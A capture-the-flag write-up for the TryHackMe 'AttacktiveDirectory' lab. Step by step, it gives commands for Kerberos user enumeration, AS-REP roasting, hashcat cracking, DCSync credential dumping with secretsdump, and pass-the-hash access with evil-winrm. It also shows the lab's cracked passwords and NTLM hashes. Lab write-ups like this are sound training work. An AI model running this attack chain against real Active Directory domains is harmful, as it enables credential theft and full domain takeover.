# Box Writeup: AttacktiveDirectory

**Platform:** TryHackMe
**Date:** 10/17/2026
**Difficulty:** Med
**OS:** Windows Server 2019
**Target IP:** 10.64.151.232

## Recon
- Nmap command used:
	- nmap -sn 10.64.151.232
	- nmap -sV 10.64.151.232
	- nmap -sV -vvv 10.64.151.232
- Open ports / services / versions:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 128 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 128 Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2026-10-17 20:32:09Z)
135/tcp  open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 128
464/tcp  open  kpasswd5?     syn-ack ttl 128
593/tcp  open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 128
3268/tcp open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
- Port profile screams Domain Controller: 53 (DNS), 88 (Kerberos), 389/636/3268/3269 (LDAP/GC), 445 (SMB), 3389 (RDP).
- Domain: **spookysec.local** | NetBIOS: **THM-AD** | Host: **AttacktiveDirectory**

## Enumeration
- Per-service enum performed (SMB, FTP, DNS, HTTP, etc.):
	- netbios-ssn + microsoft-ds?:
		- `enum4linux -A 10.64.151.232` to get general information
		- Confirmed root/parent DC, long domain name `spookysec.local`, domain SID, SMB signing required.
		- Null session allowed authentication but RPC user/group/share enum returned STATUS_ACCESS_DENIED (no anonymous user list).
	- access brute forcing:
		- Kerbrute (Kerberos pre-auth username enumeration — no creds needed, valid users return a different KDC response):
			- `kerbrute userenum --dc 10.64.151.232 -d spookysec.local userlist.txt`
			- Note: use the real DNS domain (`spookysec.local`), NOT the NetBIOS name (`THM-AD`), and `--dc` is required because the attacker box isn't using the target for DNS.

- Interesting findings (valid domain users):
	- administrator
	- svc-admin
	- backup
	- james, robin, darkstar, paradox, ori
	- `svc-admin` stands out — service account, prime target for AS-REP roasting.

## Initial Access
- Vulnerability identified:
	- **AS-REP Roasting** — the `svc-admin` account has "Do not require Kerberos pre-authentication" set (UF_DONT_REQUIRE_PREAUTH), so the DC will hand out an AS-REP encrypted with the user's password hash to any unauthenticated requester.
- How it was verified:
	- Impacket's `GetNPUsers.py` returned a `$krb5asrep$23$svc-admin@...` hash for svc-admin; all other users reported "doesn't have UF_DONT_REQUIRE_PREAUTH set".
- Exploitation steps / commands:
	- Pull the roastable hash (`-dc-ip` needed because the domain name doesn't resolve on the attacker box):
		- `GetNPUsers.py spookysec.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.txt -dc-ip 10.64.151.232`
		- usernames.txt = bare usernames, one per line (no `@domain`, no case-duplicates — AD is case-insensitive).
	- Crack the AS-REP hash (etype 23 → Hashcat mode 18200):
		- `hashcat -m 18200 hashes.txt passwordlist.txt --force`
		- Reveal result: `hashcat -m 18200 hashes.txt passwordlist.txt --show`
	- Recovered: **svc-admin : management2005**
	- Authenticated SMB share enumeration with the cracked creds:
		- `smbclient -L //10.64.151.232/ -U svc-admin`
		- Readable `backup` share contained `backup_credentials.txt` (base64).
	- Decode the loot:
		- `echo 'YmF...' | base64 -d`  →  `backup@spookysec.local:backup2517860`
	- Recovered: **backup : backup2517860**

## Privilege Escalation
- Vectors checked:
	- The `backup` account is described as "the backup account for the DC" — in AD terms it has been delegated **replication rights** (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`).
- Working path to root/SYSTEM:
	- **DCSync** via Impacket `secretsdump.py`. Any account with replication rights can impersonate a DC and request account secrets over the **DRSUAPI** method (`IDL_DRSGetNCChanges`) — no code execution or file access on the DC required.
	- `secretsdump.py spookysec.local/backup:backup2517860@10.64.151.232 -dc-ip 10.64.151.232 -just-dc`
	- The registry/VSS method failed with `rpc_s_access_denied` (backup lacks local admin), but it fell back to **DRSUAPI** and dumped the full NTDS.DIT.
	- Common pitfall: run it as the installed command `secretsdump.py ...`, NOT `python3 secretsdump.py` (that looks for a local file and 404s).

## Post-Exploitation
- Creds, hashes, configs, loot found:
	- Full NTDS dump (NTLM hashes + Kerberos keys) for every domain account. Key lines:
		- `Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::`
		- `svc-admin:1114:...:fc0f1e5359e372aa1f69147375ba6809:::`
		- `backup:1118:...:19741bde08e135f4b40f1ca9aab45538:::`
	- Detail worth noting: `Administrator` and `a-spooks` share the identical NT hash — `a-spooks` is the admin's named personal account reusing the same password.
- Pass-the-Hash for a shell (NO password needed — the hash is the credential):
	- `evil-winrm -i 10.64.151.232 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`
	- svc-admin/backup WinRM logins timed out (not in Remote Management Users), so read all three flags from the single Administrator session — admin can read every user's desktop.
- Flags (from each user's desktop):
	- svc-admin → `C:\Users\svc-admin\Desktop\user.txt.txt` → `TryHackMe{________________}`
	- backup → `C:\Users\backup\Desktop\PrivEsc.txt` → `TryHackMe{________________}`
	- administrator → `C:\Users\Administrator\Desktop\root.txt` → `TryHackMe{________________}`

## Lessons — gaps in my vault
- What my methodology vault was missing for this box:
	- The full AD kill chain in one place: **Kerbrute (user enum) → GetNPUsers (AS-REP roast) → hashcat 18200 → authenticated SMB loot → secretsdump DCSync → PTH with evil-winrm.**
	- The DNS gotcha: Kerberos/Impacket tools need `--dc` / `-dc-ip` when the attacker box isn't resolving the domain. The `Couldn't find any KDCs` and `Name or service not known` errors both trace back to this.
	- Domain-name discipline: use DNS name (`spookysec.local`) for Kerberos, not the NetBIOS name (`THM-AD`).
	- Recognizing the DCSync prerequisite: replication rights (`DS-Replication-Get-Changes-All`) on a non-admin account are game over, and the technique is the **DRSUAPI** method.
- Commands/notes to add to vault (which folder):
	- AD / Kerberos folder: Kerbrute + GetNPUsers syntax with the `--dc`/`-dc-ip` reminders.
	- Hashcat cheatsheet: 18200 = AS-REP (krb5asrep etype 23), 13100 = Kerberoast (TGS-REP).
	- Post-exploitation folder: secretsdump `-just-dc` DCSync + evil-winrm `-H` pass-the-hash one-liners.
